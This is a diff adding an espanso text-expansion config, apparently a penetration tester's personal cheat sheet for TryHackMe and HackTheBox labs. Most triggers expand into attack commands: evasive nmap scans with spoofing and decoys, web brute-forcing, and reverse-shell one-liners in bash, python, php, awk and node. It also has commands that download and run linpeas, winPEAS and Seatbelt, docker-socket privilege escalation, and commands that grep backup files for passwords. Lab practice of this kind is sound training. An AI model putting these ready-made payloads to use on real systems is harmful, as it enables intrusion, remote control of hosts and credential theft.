@@ -1,0 +1,263 @@
+# espanso configuration file
+
+# This is the default configuration file, change it as you like it
+# You can refer to the official documentation:
+# https://espanso.org/docs/
+
+# Matches are the substitution rules, when you type the "trigger" string
+# it gets replaced by the "replace" string.
+
+# Replace <insert> with IP address 
+
+matches:
+  # Simple text replacement
+  - trigger: ":espanso"
+    replace: "Hi there!"
+
+  - trigger: ":conf"
+    replace: "/home/kali/.config/espanso/default.yml"    
+
+  # Dates
+  - trigger: ":date"
+    replace: "{{mydate}}"
+    vars:
+      - name: mydate
+        type: date
+        params:
+          format: "%m/%d/%Y"
+          
+  # connect with me
+  - trigger: ":linkedin"
+    replace: "https://linkedin/in/david-ivan-hernandez"      
+
+  # edit target IP
+  - trigger: ":ip"
+    replace: "<insert>"
+
+  # tun IP
+  - trigger: ":tun"
+    replace: "<insert>"      
+
+  # openvpn labs 
+  - trigger: ":vpn thm"
+    replace: "openvpn --config /media/kali/8cabef2b-342c-4532-b403-56396803299f/Courses/tryHackMe/condoreagle.ovpn"  
+
+  - trigger: ":vpn htb"
+    replace: "openvpn --config /media/kali/8cabef2b-342c-4532-b403-56396803299f/Courses/hackTheBox/freelabs_condoreagle.ovpn"  
+
+  - trigger: ":vpn kill"
+    replace: "sudo killall openvpn"
+
+  # threader3000 scanning
+  - trigger: ":thread"
+    replace: "threader3000"
+
+  # nmap scanning 
+  - trigger: ":nmap ip"
+    replace: "mkdir nmap && echo <insert> > ipList.txt"    
+
+  - trigger: ":nmap sweep"
+    replace: "nmap -sn -oA  nmap/sweep -iL ipList.txt -v -oA nmap/sweep"
+
+  - trigger: ":nmap discovery"
+    replace: "nmap -PE -sn -oA  nmap/discovery -iL ipList.txt -v -oA nmap/discovery"
+
+  - trigger: ":nmap fast"
+    replace: "nmap --top-ports 5000 -T4 -sV -Pn -O --osscan-guess --open --max-os-tries 1 --privileged -n -v --max-retries 3 --min-rtt-timeout 500ms --max-rtt-timeout 3000ms --initial-rtt-timeout 500ms --defeat-rst-ratelimit --min-rate 450 --max-rate 15000 --data-length=50 --min-parallelism 100 -oA  nmap/customTop5000TcpScan -iL ipList.txt"
+
+  - trigger: ":nmap udp"
+    replace: "nmap --top-ports 50 -sU -T4 -sV -sC -Pn --max-os-tries 1 --privileged -n -v --max-retries 3 --min-rtt-timeout 500ms --max-rtt-timeout 3000ms --initial-rtt-timeout 500ms --min-rate 450 --max-rate 15000 --script vuln --script smb-os-discovery --script smb-enum-shares --script nfs-ls --script-timeout 180 --data-length=50 --min-parallelism 100 -oA  nmap/customTop50UdpScan -iL ipList.txt"
+
+  - trigger: ":nmap vuln"
+    replace: "nmap -p- -T4 -sV -sC -Pn -O --osscan-guess --open --max-os-tries 1 --privileged -n -v --max-retries 3 --min-rtt-timeout 500ms --max-rtt-timeout 3000ms --initial-rtt-timeout 500ms --defeat-rst-ratelimit --min-rate 450 --max-rate 15000 --script vuln --script http-unsafe-output-escaping --script http-sql-injection --script smb-os-discovery --script smb-enum-shares --script nfs-ls --script-timeout 180 --data-length=50 --min-parallelism 100 -oA  nmap/ultrafastAllTcpVulnScan -iL ipList.txt" 
+
+  - trigger: ":nmap all"
+    replace: "nmap -p- -T4 --open -Pn -n -A -sV -sC -iL ipList.txt -v -oA  nmap/AllTcpPorts"
+
+  - trigger: ":nmap stealth"
+    replace: "nmap -sS -p- --randomize-hosts -T3 -iL ipList.txt -v -oA nmap/stealthScan"
+
+  - trigger: ":nmap spoof"
+    replace: "nmap --spoof-mac apple 172.28.128.6 -p80,443,53 -Pn -iL ipList.txt -v -oA nmap/spoofScan --disable-arp-ping -n"
+
+  - trigger: ":nmap bypass"
+    replace: "nmap -sS --source-port 53 -p 53 -iL ipList.txt -v -oA nmap/bypassScan"
+
+  - trigger: ":nmap decoy"
+    replace: "nmap -D RND:10 -sS -p- -Pn --disable-arp-ping -iL ipList.txt -v -oA nmap/decoyScan"
+
+
+  #web scanning
+  - trigger: ":nikto"
+    replace: "nikto -timeout 30 -output nikto.txt -h http://"
+
+  - trigger: ":amass passive"
+    replace: "amass enum -passive -d DOMAIN -src"
+
+  - trigger: ":amass active"
+    replace: "amass enum -active -brute -w /usr/share/amass/wordlists/deepmagic.com_top50kprefixes.txt -src -ip -dir amass_scan -o amass_results_IP.txt -d WEBSITE"
+
+  - trigger: ":ferox com"
+    replace: "feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt  --threads 150 --redirects --depth 6 -x pdf -x js,html -x php txt json,docx --output feroxContentScan.md --url http://"
+
+  - trigger: ":ferox small"
+    replace: "feroxbuster --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --threads 150 --redirects --depth 6 --extract-links --output feroxContentScan.md --url http://"
+
+  - trigger: ":ferox med"
+    replace: "feroxbuster --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --threads 150 --no-recursion --output feroxContentScan.md --url http://"
+
+  - trigger: ":ferox big"
+    replace: "feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt --threads 150 --no-recursion --output feroxLargeContentScan.md --url http://"
+
+  - trigger: ":ferox sub"
+    replace: "feroxbuster --wordlist /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --threads 100 --output feroxSubdomainScan.md --url http://"
+
+  - trigger: ":go com"
+    replace: ":/home/kali/Shared/Opt-Tools/gobuster/gobuster-linux-amd64/./gobuster dir --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt -t 100 -x .txt,.zip,.html,.php,.js,.json,.pdf,.api -r --output goBuster.md --url http://"
+    
+  - trigger: ":go small"
+    replace: "/home/kali/Shared/Opt-Tools/gobuster/gobuster-linux-amd64/./gobuster dir -s 200,204,301,302,307,500 -x .txt,.zip,.html,.php,.js,.json,.pdf,.api --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 200 -r --output goBuster.md --url http://"
+    
+  - trigger: ":go big"
+    replace: "/home/kali/Shared/Opt-Tools/gobuster/gobuster-linux-amd64/./gobuster dir -e -s 200,204,301,302,307,500 --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 200 -r --output goBuster.md --url http://"    
+   
+  - trigger: ":dirsearch"
+    replace: "python3 /home/kali/Shared/Opt-Tools/dirsearch/dirsearch.py -t 100 --extensions=all  -E -x 400 -w /usr/share/seclists/Discovery/Web-Content/common.txt -l --plain-text-report=dirsearch.md -u http://"
+
+  - trigger: ":ffuf com"
+    replace: "/home/kali/Shared/Opt-Tools/ffuf/./ffuf -r -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .txt,.js,.json,.php,.html,.bak,.old,.sql -fc 403 -c -t 200 -of md -o ffufCommon.md  -u http://?/FUZZ"
+
+  - trigger: ":ffuf small"
+    replace: "/home/kali/Shared/Opt-Tools/ffuf/./ffuf -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -e .txt,.js,.json,.php,.html,.bak,.old,.sql -fc 403 -c -t 200 -of md -o ffufCommon.md  -u http://?/FUZZ"
+
+  - trigger: ":ffuf med"
+    replace: "/home/kali/Shared/Opt-Tools/ffuf/./ffuf -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fc 403 -of md -o ffufCommon.md -c -t 200 -u http://?/FUZZ"
+
+  - trigger: ":ffuf big"
+    replace: "/home/kali/Shared/Opt-Tools/ffuf/./ffuf -r -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -fc 403 -of md -o ffufBig.md -c -t 200 -u http://?/FUZZ"
+
+  - trigger: ":ffuf sub"
+    replace: "/home/kali/Shared/Opt-Tools/ffuf/./ffuf -r -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.IP.' -of md -o ffufSubdomains.md -c -t 200 -u http://"
+
+  - trigger: ":vhost"
+    replace: "/home/kali/Shared/Opt-Tools/gobuster/gobuster-linux-amd64/./gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 100 --output goBusterSubdomain.md --url http://"
+
+  - trigger: ":wfuzz vhost"
+    replace: "wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hc 404 --hl 9  -c -t 50 -H 'Host: FUZZ.DOMAIN.HERE' -u http://"
+
+    # python server port 80
+  - trigger: ":server"
+    replace: "python3 -m http.server 80"
+
+    # nc listener for rev shell
+  - trigger: ":listen"
+    replace: "nc -lvnp 1337"
+
+    # socat listener for rev shell
+  - trigger: ":socat listen"
+    replace: "socat TCP-L:4444 FILE: 'tty',raw,echo=0"
+
+    # socat activate shell
+  - trigger: ":socat active"
+    replace: "socat TCP:<insert>:4444 EXEC:\"bash -li\",pty,stderr,sigint,setsid,sane"
+
+    # run a stable bash shell via python
+  - trigger: ":stable"
+    replace: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
+    
+    # if above does not function, try this
+  - trigger: ":bash"
+    replace: "/usr/bin/script -qc /bin/bash /dev/null"   
+
+    # run a sh shell 
+  - trigger: ":sh"
+    replace: "/usr/bin/script -qc /bin/sh /dev/null"    
+
+    # spawn shell after ctrl+z command
+  - trigger: ":spawn"
+    replace: "stty raw -echo;fg;export TERM=xterm;"
+
+    # find SUID files 
+  - trigger: ":suid"
+    replace: "find / -perm -4000 2>/dev/null"
+
+  # download and run winpeas on target (cd /home/kali/Shared/Opt-Tools/static-binaries/otherBinaries/windows)
+  - trigger: ":winpeas"
+    replace: "certutil.exe -urlcache -split -f http://<insert>/winPEAS.exe winpeas.exe"
+
+  # download and run seatbelt on target (cd /home/kali/Shared/Opt-Tools/static-binaries/otherBinaries/windows)
+  - trigger: ":seatbelt"
+    replace: "certutil.exe -urlcache -split -f http://<insert>/Seatbelt.exe Seatbelt.exe"
+
+    # download and run linpeas on target
+  - trigger: ":linpeas"
+    replace: "wget http://<insert>/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh"
+    
+  - trigger: ":curl linpeas"
+    replace: "curl http://<insert>/linpeas.sh -o linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh"
+
+    # docker privesc
+  - trigger: ":docker1"
+    replace: "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
+
+  - trigger: ":docker2"
+    replace: "ls -la /run/docker.sock"
+    
+  - trigger: ":docker3"
+    replace: "curl -s --unix-socket /var/run/docker.sock http://localhost/images/json"
+
+    # find flags files
+  - trigger: ":flag1"
+    replace: "find / -type f -name flag* 2>/dev/null;  find / -type f -name *.txt 2>/dev/null" 
+
+  - trigger: ":flag3"
+    replace: "find / -name *.flag 2>/dev/null; find / -name flag.txt 2>/dev/null; find / -name user.txt 2>/dev/null; find / -name root.txt 2>/dev/null; find / -name thm* 2>/dev/null; find / -name THM{* 2>/dev/null;"
+
+  - trigger: ":flag2"
+    replace: "find / -type f -size 33c -exec grep -l -E '^.{32}$' {} + 2>/dev/null"
+
+    # download chisel binary for portforwarding
+  - trigger: ":chisel"
+    replace: "curl http://<insert>/chisel_1.7.1_linux_386 -o chisel && chmod +x chisel"
+
+    # check for open running ports
+  - trigger: ":open"
+    replace: "ss -ltn"
+
+    # rev bash shell 
+  - trigger: ":revbash"
+    replace: "bash -i >& /dev/tcp/<insert>/1337 0>&1"
+    
+    # rev python shell
+  - trigger: ":revpy"
+    replace: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<insert>\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+
+    # rev php shell
+  - trigger: ":revphp"
+    replace: "php -r '$sock=fsockopen(\"<insert>\",1337);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+
+    # rev awk shell when all fails 
+  - trigger: ":revawk"
+    replace: "awk 'BEGIN {s = "/inet/tcp/0/<insert>/1337"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null"
+
+    # rev js shell 
+  - trigger: ":revjs"
+    replace: "require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <insert> 1337  >/tmp/f ')"
+
+    # check for cron privesc
+  - trigger: ":cron1"
+    replace: "crontab -l"
+
+    # check for cron privesc
+  - trigger: ":cron2"
+    replace: "ls -al /etc/cron* /etc/at*"
+
+    # check for cron privesc
+  - trigger: ":cron3"
+    replace: "cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v \"^#\""
+
+    # check for backup passwords in linux files
+  - trigger: ":backup"
+    replace: "cd /var/backups && cat .bak.passwd | grep -i password"
+
+
